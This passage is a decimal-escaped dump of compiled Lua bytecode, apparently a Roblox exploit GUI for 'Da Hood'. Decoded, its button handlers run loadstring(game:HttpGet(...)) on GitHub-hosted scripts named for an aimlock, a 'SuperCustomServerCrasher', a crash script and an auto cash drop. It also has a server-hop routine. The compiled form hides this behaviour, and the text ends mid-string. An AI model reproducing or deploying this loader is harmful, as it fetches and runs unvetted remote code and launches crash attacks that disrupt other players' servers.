0\0\0\104\117\109\97\110\0\4\7\0\0\0\72\101\97\108\116\104\0\3\0\0\0\0\0\0\0\0\4\10\0\0\0\109\111\117\115\101\100\111\119\110\0\4\3\0\0\0\66\80\0\4\7\0\0\0\114\101\109\111\118\101\0\4\6\0\0\0\112\111\105\110\116\0\4\5\0\0\0\116\111\111\108\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\27\13\0\0\27\13\0\0\1\0\0\2\4\0\0\0\5\0\0\0\68\0\0\0\28\64\0\1\30\0\128\0\1\0\0\0\4\14\0\0\0\111\110\66\117\116\116\111\110\49\68\111\119\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\28\13\0\0\28\13\0\0\0\0\0\2\3\0\0\0\2\0\0\0\7\0\0\0\30\0\128\0\1\0\0\0\4\10\0\0\0\109\111\117\115\101\100\111\119\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\29\13\0\0\29\13\0\0\1\1\0\4\5\0\0\0\69\0\0\0\128\0\0\0\196\0\0\0\92\64\128\1\30\0\128\0\1\0\0\0\4\10\0\0\0\111\110\75\101\121\68\111\119\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\50\13\0\0\72\13\0\0\1\0\0\2\56\0\0\0\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\64\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\128\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\192\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\194\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\192\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\128\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\64\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\193\129\22\0\242\127\30\0\128\0\9\0\0\0\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\169\63\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\84\114\97\110\115\112\97\114\101\110\99\121\0\3\0\0\0\0\0\0\224\63\3\51\51\51\51\51\51\227\63\3\102\102\102\102\102\102\230\63\3\154\153\153\153\153\153\233\63\3\205\204\204\204\204\204\236\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\87\13\0\0\109\13\0\0\1\0\0\2\56\0\0\0\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\64\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\128\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\192\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\194\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\192\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\128\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\64\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\193\129\22\0\242\127\30\0\128\0\9\0\0\0\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\169\63\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\84\114\97\110\115\112\97\114\101\110\99\121\0\3\0\0\0\0\0\0\224\63\3\51\51\51\51\51\51\227\63\3\102\102\102\102\102\102\230\63\3\154\153\153\153\153\153\233\63\3\205\204\204\204\204\204\236\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\124\13\0\0\146\13\0\0\1\0\0\2\56\0\0\0\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\64\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\128\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\192\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\194\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\192\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\128\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\64\193\129\5\0\0\0\65\64\0\0\28\64\0\1\4\0\0\0\6\128\64\0\9\0\193\129\22\0\242\127\30\0\128\0\9\0\0\0\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\169\63\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\84\114\97\110\115\112\97\114\101\110\99\121\0\3\0\0\0\0\0\0\224\63\3\51\51\51\51\51\51\227\63\3\102\102\102\102\102\102\230\63\3\154\153\153\153\153\153\233\63\3\205\204\204\204\204\204\236\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\149\13\0\0\149\13\0\0\1\0\0\2\4\0\0\0\4\0\0\0\11\0\64\0\28\64\0\1\30\0\128\0\1\0\0\0\4\11\0\0\0\77\97\107\101\74\111\105\110\116\115\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\153\13\0\0\155\13\0\0\1\0\0\2\4\0\0\0\5\0\0\0\68\0\0\0\28\64\0\1\30\0\128\0\1\0\0\0\4\6\0\0\0\112\99\97\108\108\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\160\13\0\0\169\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\166\13\0\0\168\13\0\0\0\0\0\4\8\0\0\0\5\0\0\0\69\64\0\0\75\128\192\0\193\192\0\0\92\0\128\1\28\128\0\0\28\64\128\0\30\0\128\0\4\0\0\0\4\11\0\0\0\108\111\97\100\115\116\114\105\110\103\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\72\116\116\112\71\101\116\0\4\79\0\0\0\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\68\51\52\84\72\69\86\49\76\47\68\97\72\111\111\100\67\111\100\101\115\83\111\117\114\99\101\47\109\97\105\110\47\65\105\109\76\111\99\107\46\76\117\97\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\171\13\0\0\179\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\176\13\0\0\178\13\0\0\0\0\0\4\8\0\0\0\5\0\0\0\69\64\0\0\75\128\192\0\193\192\0\0\92\0\128\1\28\128\0\0\28\64\128\0\30\0\128\0\4\0\0\0\4\11\0\0\0\108\111\97\100\115\116\114\105\110\103\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\72\116\116\112\71\101\116\0\4\117\0\0\0\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\83\50\49\79\102\102\105\99\105\97\108\47\68\72\45\84\66\45\67\114\97\115\104\47\109\97\105\110\47\83\119\97\103\109\111\100\101\37\50\48\99\114\97\115\104\37\50\48\109\111\100\105\102\105\101\100\37\50\48\40\98\101\116\116\101\114\37\50\48\70\80\83\41\37\50\48\99\114\97\115\104\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\181\13\0\0\189\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\186\13\0\0\188\13\0\0\0\0\0\4\8\0\0\0\5\0\0\0\69\64\0\0\75\128\192\0\193\192\0\0\92\0\128\1\28\128\0\0\28\64\128\0\30\0\128\0\4\0\0\0\4\11\0\0\0\108\111\97\100\115\116\114\105\110\103\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\72\116\116\112\71\101\116\0\4\89\0\0\0\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\101\114\107\101\114\109\101\114\47\108\117\97\45\112\114\111\106\101\99\116\115\47\109\97\115\116\101\114\47\83\117\112\101\114\67\117\115\116\111\109\83\101\114\118\101\114\67\114\97\115\104\101\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\191\13\0\0\199\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\196\13\0\0\198\13\0\0\0\0\0\5\14\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\11\192\64\0\133\0\0\0\134\0\65\1\197\0\0\0\198\64\193\1\5\1\0\0\6\129\65\2\6\193\65\2\28\64\128\2\30\0\128\0\8\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\16\0\0\0\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\0\4\24\0\0\0\84\101\108\101\112\111\114\116\84\111\80\108\97\99\101\73\110\115\116\97\110\99\101\0\4\8\0\0\0\80\108\97\99\101\73\100\0\4\6\0\0\0\74\111\98\73\100\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\201\13\0\0\210\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\207\13\0\0\209\13\0\0\0\0\0\10\72\0\0\0\5\0\0\0\26\64\0\0\22\192\1\128\5\64\0\0\69\128\0\0\75\192\192\0\193\0\1\0\92\0\128\1\28\128\0\0\28\64\128\0\22\64\1\128\5\64\1\0\26\0\0\0\22\128\0\128\5\64\1\0\6\128\65\0\28\64\128\0\5\192\1\0\65\0\2\0\28\64\0\1\5\0\0\0\65\64\2\0\129\128\2\0\193\0\2\0\1\193\2\0\28\64\128\2\1\0\3\0\69\128\0\0\70\64\195\0\129\128\3\0\21\128\0\0\74\0\128\0\133\128\0\0\134\192\67\1\98\64\128\0\131\0\0\1\197\0\4\0\36\1\0\0\0\0\128\0\220\64\0\1\228\64\0\0\0\0\128\0\36\129\0\0\0\0\0\0\0\0\128\0\0\0\0\1\0\0\128\1\64\1\0\2\92\65\128\0\23\64\68\1\22\0\2\128\74\1\128\0\133\129\0\0\134\193\67\3\98\65\128\0\64\0\128\2\64\1\128\1\92\65\128\0\64\1\0\2\92\65\128\0\23\64\68\1\22\0\2\128\69\193\1\0\129\129\4\0\92\65\0\1\69\1\0\0\129\65\2\0\193\129\2\0\1\194\4\0\65\194\2\0\92\65\128\2\30\0\128\0\20\0\0\0\4\23\0\0\0\73\114\105\115\78\111\116\105\102\105\99\97\116\105\111\110\77\114\74\97\99\107\0\4\11\0\0\0\108\111\97\100\115\116\114\105\110\103\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\72\116\116\112\71\101\116\0\4\97\0\0\0\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\116\104\101\100\114\97\103\111\110\115\108\97\121\101\114\50\47\104\101\121\47\109\97\105\110\47\77\105\115\99\46\47\105\114\105\115\37\50\48\110\111\116\105\102\105\99\97\116\105\111\110\37\50\48\102\117\110\99\116\105\111\110\0\4\27\0\0\0\73\114\105\115\78\111\116\105\102\105\99\97\116\105\111\110\85\115\101\114\77\114\74\97\99\107\0\4\22\0\0\0\67\108\101\97\114\65\108\108\78\111\116\105\102\105\99\97\116\105\111\110\115\0\4\5\0\0\0\119\97\114\110\0\4\21\0\0\0\76\111\111\107\105\110\103\32\70\111\114\32\65\32\83\101\114\118\101\114\0\3\0\0\0\0\0\0\240\63\4\13\0\0\0\78\111\116\105\102\105\99\97\116\105\111\110\0\3\0\0\0\0\0\0\0\64\4\35\0\0\0\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47\0\4\8\0\0\0\80\108\97\99\101\73\100\0\4\41\0\0\0\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\68\101\115\99\38\108\105\109\105\116\61\49\48\48\0\4\6\0\0\0\74\111\98\73\100\0\4\6\0\0\0\112\99\97\108\108\0\0\4\18\0\0\0\83\101\114\118\101\114\32\72\111\112\32\70\97\105\108\101\100\0\4\16\0\0\0\78\111\32\83\101\114\118\101\114\32\70\111\117\110\100\0\3\0\0\0\0\0\0\0\208\13\0\0\208\13\0\0\1\0\0\4\19\0\0\0\5\0\0\0\65\64\0\0\28\128\0\1\26\64\0\0\22\128\0\128\5\128\0\0\65\64\0\0\28\64\0\1\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\128\65\0\133\192\1\0\193\0\2\0\156\0\0\1\28\128\0\0\8\0\0\0\30\0\128\0\9\0\0\0\4\9\0\0\0\105\115\102\111\108\100\101\114\0\4\16\0\0\0\77\114\74\97\99\107\32\83\101\116\116\105\110\103\115\0\4\11\0\0\0\109\97\107\101\102\111\108\100\101\114\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\12\0\0\0\72\116\116\112\83\101\114\118\105\99\101\0\4\11\0\0\0\74\83\79\78\68\101\99\111\100\101\0\4\9\0\0\0\114\101\97\100\102\105\108\101\0\4\31\0\0\0\77\114\74\97\99\107\32\83\101\116\116\105\110\103\115\47\83\101\114\118\101\114\72\111\112\46\106\115\111\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\208\13\0\0\208\13\0\0\1\0\0\2\5\0\0\0\5\0\0\0\100\0\0\0\4\0\0\0\28\64\0\1\30\0\128\0\1\0\0\0\4\6\0\0\0\112\99\97\108\108\0\1\0\0\0\0\0\0\0\208\13\0\0\208\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\65\64\0\0\133\128\0\0\139\192\64\1\1\1\1\0\156\128\128\1\139\64\65\1\4\1\0\0\156\0\128\1\28\64\0\0\30\0\128\0\6\0\0\0\4\10\0\0\0\119\114\105\116\101\102\105\108\101\0\4\31\0\0\0\77\114\74\97\99\107\32\83\101\116\116\105\110\103\115\47\83\101\114\118\101\114\72\111\112\46\106\115\111\110\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\12\0\0\0\72\116\116\112\83\101\114\118\105\99\101\0\4\11\0\0\0\74\83\79\78\69\110\99\111\100\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\208\13\0\0\208\13\0\0\4\0\0\12\120\0\0\0\5\0\0\0\6\64\64\0\28\128\128\0\26\0\0\0\22\64\28\128\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\133\128\0\0\139\128\65\1\4\1\0\0\156\0\128\1\28\128\0\0\70\192\65\0\133\0\2\0\198\64\66\0\3\1\0\2\22\192\17\128\197\129\2\0\0\2\0\3\220\129\0\1\23\192\194\3\22\128\16\128\198\1\67\3\218\1\0\0\22\192\15\128\197\65\3\0\6\130\67\3\220\129\0\1\218\1\0\0\22\128\14\128\197\65\3\0\6\194\67\3\220\129\0\1\218\1\0\0\22\64\13\128\197\65\3\0\6\194\67\3\220\129\0\1\5\66\3\0\70\130\67\3\28\130\0\1\24\192\1\4\22\64\11\128\198\1\67\3\5\130\0\0\6\2\68\4\87\0\130\3\22\0\10\128\197\193\2\0\198\65\196\3\4\2\128\0\70\2\67\3\220\129\128\1\218\65\0\0\22\64\8\128\198\1\67\3\200\1\0\1\197\129\4\0\1\194\4\0\70\2\67\3\21\66\2\4\220\65\0\1\197\1\5\0\1\66\5\0\65\130\5\0\129\194\5\0\198\2\67\3\149\194\2\5\193\2\6\0\220\65\128\2\197\193\2\0\198\65\198\3\4\2\128\0\70\2\67\3\220\65\128\1\196\1\128\1\220\65\128\0\197\129\0\0\203\193\192\3\65\130\6\0\220\129\128\1\203\193\198\3\69\130\0\0\70\2\199\4\134\2\67\3\220\65\0\2\197\65\0\0\1\2\6\0\220\65\0\1\161\128\0\0\22\64\237\127\90\0\0\0\22\128\5\128\132\0\0\0\139\64\68\1\1\65\7\0\156\128\128\1\154\0\0\0\22\0\2\128\196\0\0\0\203\128\199\1\68\1\0\0\75\193\199\2\192\1\0\1\92\129\128\1\129\1\8\0\220\128\0\2\200\0\0\0\196\0\0\0\1\65\7\0\64\1\128\0\213\64\129\1\200\0\0\0\22\128\226\127\22\0\0\128\22\0\226\127\30\0\128\0\33\0\0\0\4\5\0\0\0\116\97\115\107\0\4\5\0\0\0\119\97\105\116\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\12\0\0\0\72\116\116\112\83\101\114\118\105\99\101\0\4\11\0\0\0\74\83\79\78\68\101\99\111\100\101\0\4\13\0\0\0\72\116\116\112\71\101\116\65\115\121\110\99\0\4\15\0\0\0\110\101\120\116\80\97\103\101\67\117\114\115\111\114\0\4\5\0\0\0\110\101\120\116\0\4\5\0\0\0\100\97\116\97\0\4\5\0\0\0\116\121\112\101\0\4\6\0\0\0\116\97\98\108\101\0\4\3\0\0\0\105\100\0\4\9\0\0\0\116\111\110\117\109\98\101\114\0\4\8\0\0\0\112\108\97\121\105\110\103\0\4\11\0\0\0\109\97\120\80\108\97\121\101\114\115\0\4\6\0\0\0\74\111\98\73\100\0\4\5\0\0\0\102\105\110\100\0\4\5\0\0\0\119\97\114\110\0\4\14\0\0\0\83\101\114\118\101\114\32\70\111\117\110\100\32\0\4\23\0\0\0\73\114\105\115\78\111\116\105\102\105\99\97\116\105\111\110\77\114\74\97\99\107\0\3\0\0\0\0\0\0\240\63\4\13\0\0\0\78\111\116\105\102\105\99\97\116\105\111\110\0\4\23\0\0\0\84\101\108\101\112\111\114\116\105\110\103\32\84\111\32\83\101\114\118\101\114\10\0\3\0\0\0\0\0\0\20\64\4\7\0\0\0\105\110\115\101\114\116\0\4\16\0\0\0\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\0\4\24\0\0\0\84\101\108\101\112\111\114\116\84\111\80\108\97\99\101\73\110\115\116\97\110\99\101\0\4\8\0\0\0\80\108\97\99\101\73\100\0\4\9\0\0\0\38\99\117\114\115\111\114\61\0\4\5\0\0\0\103\115\117\98\0\4\4\0\0\0\115\117\98\0\4\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\212\13\0\0\220\13\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\217\13\0\0\219\13\0\0\0\0\0\5\9\0\0\0\5\0\0\0\69\64\0\0\75\128\192\0\193\192\0\0\2\1\128\0\92\0\0\2\28\128\0\0\28\64\128\0\30\0\128\0\4\0\0\0\4\11\0\0\0\108\111\97\100\115\116\114\105\110\103\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\72\116\116\112\71\101\116\0\4\97\0\0\0\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\82\97\121\99\111\100\101\120\47\69\120\112\108\111\105\116\105\110\103\47\109\97\105\110\47\82\111\98\108\111\120\47\68\97\37\50\48\72\111\111\100\37\50\48\65\117\116\111\37\50\48\67\97\115\104\37\50\48\68\114\111\112\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\222\13\0\0\58\14\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\227\13\0\0\57\14\0\0\0\0\0\10\37\0\0\0\5\0\0\0\74\0\0\0\138\64\0\0\228\0\0\0\137\192\128\128\28\128\128\1\70\128\64\0\70\192\192\0\164\64\0\0\0\0\0\0\197\0\1\0\6\129\64\0\11\65\65\2\28\1\0\1\220\0\1\0\22\0\1\128\87\64\128\3\22\128\0\128\0\2\0\1\64\2\128\3\28\66\0\1\225\128\0\0\22\0\254\127\198\128\64\0\198\128\193\1\203\192\193\1\64\1\0\1\220\64\128\1\195\0\128\1\6\1\66\0\6\65\66\2\11\193\65\2\164\129\0\0\0\0\128\0\0\0\128\1\28\65\128\1\30\0\128\0\10\0\0\0\4\13\0\0\0\115\101\116\109\101\116\97\116\97\98\108\101\0\4\8\0\0\0\95\95\105\110\100\101\120\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\7\0\0\0\105\112\97\105\114\115\0\4\11\0\0\0\71\101\116\80\108\97\121\101\114\115\0\4\12\0\0\0\80\108\97\121\101\114\65\100\100\101\100\0\4\8\0\0\0\67\111\110\110\101\99\116\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\10\0\0\0\72\101\97\114\116\98\101\97\116\0\3\0\0\0\0\0\0\0\231\13\0\0\237\13\0\0\0\2\0\5\10\0\0\0\133\0\0\0\134\64\64\1\197\0\0\0\0\1\128\0\156\128\128\1\154\0\0\0\22\0\0\128\9\128\128\0\158\0\0\1\30\0\128\0\2\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\243\13\0\0\28\14\0\0\1\1\0\8\29\0\0\0\66\0\0\0\131\0\128\1\36\1\0\0\0\0\0\1\0\0\128\1\0\0\128\0\64\1\0\2\134\1\64\0\154\65\0\0\22\128\0\128\134\65\64\0\139\129\64\3\156\129\0\1\92\65\0\1\70\65\64\0\75\193\192\2\192\1\0\2\92\65\128\1\68\1\0\0\70\1\193\2\70\65\193\2\75\193\192\2\228\65\0\0\0\0\0\1\0\0\128\1\0\0\128\0\0\0\0\0\92\65\128\1\30\0\128\0\6\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\67\104\97\114\97\99\116\101\114\65\100\100\101\100\0\4\5\0\0\0\87\97\105\116\0\4\8\0\0\0\67\111\110\110\101\99\116\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\10\0\0\0\72\101\97\114\116\98\101\97\116\0\2\0\0\0\0\0\0\0\248\13\0\0\255\13\0\0\3\1\0\4\13\0\0\0\8\0\0\0\69\0\0\0\92\64\128\0\75\64\64\0\193\128\0\0\92\128\128\1\72\0\128\0\68\0\128\0\90\0\0\0\22\128\253\127\66\0\0\0\72\0\0\1\30\0\128\0\3\0\0\0\4\5\0\0\0\119\97\105\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3\14\0\0\27\14\0\0\4\0\0\9\114\0\0\0\4\0\0\0\26\0\0\0\22\64\27\128\4\0\0\0\11\0\64\0\133\64\0\0\28\128\128\1\26\0\0\0\22\192\25\128\4\0\128\0\26\0\0\0\22\0\25\128\4\0\128\0\11\0\64\0\132\0\0\0\28\128\128\1\26\0\0\0\22\128\23\128\4\0\128\0\6\128\64\0\6\192\64\0\88\0\0\130\22\0\1\128\4\0\128\0\6\64\65\0\6\192\64\0\24\0\0\131\22\0\21\128\4\0\0\1\23\192\65\0\22\128\4\128\5\0\2\0\6\64\66\0\11\128\66\0\129\192\2\0\202\128\0\0\1\65\3\0\69\129\3\0\132\1\128\1\92\129\0\1\21\65\1\2\201\0\1\134\5\1\4\0\6\65\68\2\65\129\4\0\129\193\4\0\193\1\5\0\28\129\0\2\201\0\129\135\28\64\0\2\2\0\128\0\8\0\0\1\5\64\5\0\68\0\0\0\75\128\197\0\92\0\0\1\28\0\1\0\22\128\6\128\75\193\69\2\193\1\6\0\92\129\128\1\90\1\0\0\22\64\5\128\9\193\193\140\69\129\6\0\70\193\198\2\129\1\5\0\193\1\5\0\1\2\5\0\92\129\0\2\9\65\1\129\69\129\6\0\70\193\198\2\129\1\5\0\193\1\5\0\1\2\5\0\92\129\0\2\9\65\129\130\69\65\7\0\70\193\198\2\129\1\5\0\193\1\5\0\1\2\5\0\92\129\0\2\9\65\1\142\33\128\0\0\22\128\248\127\4\0\128\0\9\192\193\140\4\0\128\0\69\128\6\0\70\192\198\0\129\0\5\0\193\0\5\0\1\1\5\0\92\128\0\2\9\64\0\129\4\0\128\0\69\128\6\0\70\192\198\0\129\0\5\0\193\0\5\0\1\1\5\0\92\128\0\2\9\64\128\130\4\0\128\0\69\64\7\0\70\192\198\0\129\0\5\0\193\0\5\0\1\1\5\0\92\128\0\2\9\64\0\142\30\0\128\0\30\0\0\0\4\15\0\0\0\73\115\68\101\115\99\101\110\100\97\110\116\79\102\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\24\0\0\0\65\115\115\